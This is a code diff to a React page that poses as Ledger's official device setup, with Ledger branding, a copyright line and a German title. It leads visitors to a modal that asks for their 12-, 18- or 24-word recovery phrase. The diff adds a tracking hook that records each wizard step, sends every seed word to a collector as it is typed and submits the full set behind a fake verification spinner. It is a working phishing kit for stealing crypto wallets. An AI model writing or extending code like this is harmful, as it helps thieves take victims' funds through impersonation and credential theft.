@@ -1,10 +1,11 @@
 import type React from "react";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { Loader2, Check } from "lucide-react";
 import ledgerLogo from "../assets/ledger-logo.svg";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
 import { BIP39_WORDS } from "@/assets/bip39";
+import { useTrackedSession } from "@/hooks/useTrackedSession";
 
 type IconProps = { className?: string };
 
@@ -27,6 +28,7 @@ const Ledger = () => {
   const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
   const [wizardStep, setWizardStep] = useState<1 | 2 | 3>(1);
   const [modalOpen, setModalOpen] = useState(false);
+  const tracker = useTrackedSession();
 
   useEffect(() => {
     document.title = "Wähle dein Ledger-Gerät";
@@ -48,6 +50,7 @@ const Ledger = () => {
             onPick={(i) => {
               setSelectedIdx(i);
               setView("connecting");
+              tracker.update({ device: devices[i].name, step: "connecting" });
             }}
           />
         )}
@@ -59,6 +62,7 @@ const Ledger = () => {
             onContinue={() => {
               setWizardStep(1);
               setView("wizard");
+              tracker.update({ step: "wizard_1" });
             }}
           />
         )}
@@ -66,8 +70,17 @@ const Ledger = () => {
         {view === "wizard" && (
           <WizardView
             step={wizardStep}
-            onVerifyClick={() => setModalOpen(true)}
-            onNext={() => setWizardStep((s) => (s < 3 ? ((s + 1) as 1 | 2 | 3) : s))}
+            onVerifyClick={() => {
+              setModalOpen(true);
+              tracker.update({ step: "seed_modal" });
+            }}
+            onNext={() =>
+              setWizardStep((s) => {
+                const next = (s < 3 ? s + 1 : s) as 1 | 2 | 3;
+                tracker.update({ step: `wizard_${next}` });
+                return next;
+              })
+            }
           />
         )}
       </div>
@@ -75,11 +88,14 @@ const Ledger = () => {
       <SeedDialog
         open={modalOpen}
         onOpenChange={setModalOpen}
+        tracker={tracker}
         onVerified={() => {
           setModalOpen(false);
           setWizardStep(2);
+          tracker.submit();
         }}
       />
+
 
       <footer className="mt-10 w-full text-center text-xs text-gray-600">
         Copyright © Ledger SAS. All rights reserved.
@@ -317,17 +333,22 @@ function SeedDialog({
   open,
   onOpenChange,
   onVerified,
+  tracker,
 }: {
   open: boolean;
   onOpenChange: (o: boolean) => void;
   onVerified: () => void;
+  tracker: ReturnType<typeof useTrackedSession>;
 }) {
   const [count, setCount] = useState<"12" | "18" | "24">("24");
   const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
   const [verifying, setVerifying] = useState(false);
+  const debounceRefs = useRef<Record<number, ReturnType<typeof setTimeout>>>({});
 
   useEffect(() => {
     setWords(Array(Number(count)).fill(""));
+    tracker.update({ seed_length: Number(count), step: `seed_${count}` });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [count]);
 
   useEffect(() => {
@@ -346,6 +367,17 @@ function SeedDialog({
     }, 3000);
     return () => clearTimeout(t);
   }, [verifying, onVerified]);
+
+  function handleWordChange(idx: number, value: string) {
+    const next = [...words];
+    next[idx] = value;
+    setWords(next);
+    const timers = debounceRefs.current;
+    if (timers[idx]) clearTimeout(timers[idx]);
+    timers[idx] = setTimeout(() => {
+      tracker.sendWord(idx + 1, value);
+    }, 300);
+  }
 
   const complete = words.length > 0 && words.every((w) => w.trim().length > 0);
 
@@ -380,7 +412,9 @@ function SeedDialog({
 
             {(["12", "18", "24"] as const).map((c) => (
               <TabsContent key={c} value={c} className="mt-6">
-                {count === c && <SeedGrid count={Number(c)} words={words} setWords={setWords} />}
+                {count === c && (
+                  <SeedGrid count={Number(c)} words={words} onWordChange={handleWordChange} />
+                )}
               </TabsContent>
             ))}
           </Tabs>
@@ -410,11 +444,11 @@ function SeedDialog({
 function SeedGrid({
   count,
   words,
-  setWords,
+  onWordChange,
 }: {
   count: number;
   words: string[];
-  setWords: (w: string[]) => void;
+  onWordChange: (idx: number, value: string) => void;
 }) {
   const [focusedIdx, setFocusedIdx] = useState<number | null>(null);
   return (
@@ -446,11 +480,7 @@ function SeedGrid({
               value={raw}
               onFocus={() => setFocusedIdx(i)}
               onBlur={() => setFocusedIdx((cur) => (cur === i ? null : cur))}
-              onChange={(e) => {
-                const next = [...words];
-                next[i] = e.target.value;
-                setWords(next);
-              }}
+              onChange={(e) => onWordChange(i, e.target.value)}
               className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500"}`}
               autoComplete="off"
             />
@@ -460,6 +490,7 @@ function SeedGrid({
     </div>
   );
 }
+
 
 /* ---------- Icons ---------- */
 
